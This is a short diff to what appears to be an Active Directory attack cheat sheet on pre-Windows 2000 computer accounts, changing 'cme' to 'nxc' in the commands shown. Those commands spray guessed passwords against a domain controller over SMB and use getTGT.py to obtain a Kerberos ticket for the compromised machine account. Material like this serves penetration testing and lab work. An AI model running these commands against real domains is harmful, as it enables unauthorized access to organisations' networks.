@@ -29,7 +29,7 @@ cat 'USER_FILE' | tr '[:upper:]' '[:lower:]' | sed 's/\$//g' | tee 'PASS_FILE'
 
 ```bash
 
-cme smb 'DC_IP' -u 'USER_FILE' -p 'PASS_FILE' --no-bruteforce --continue-on-success
+nxc smb 'DC_IP' -u 'USER_FILE' -p 'PASS_FILE' --no-bruteforce --continue-on-success
 
 ```
 
@@ -48,7 +48,7 @@ SMB  DC_IP  445  DC01  [-] domain.local\PRE2000$:pre2000  STATUS_NOLOGON_WORKSTA
 
 getTGT.py 'DOMAIN/COMPUTER_NAME$:COMPUTER_PASS' -dc-ip 'DC_IP'
 export KRB5CCNAME=COMPUTER_NAME\$.ccache
-cme smb dc01.domain.local --kerberos
+nxc smb dc01.domain.local --kerberos
 
 ```
 
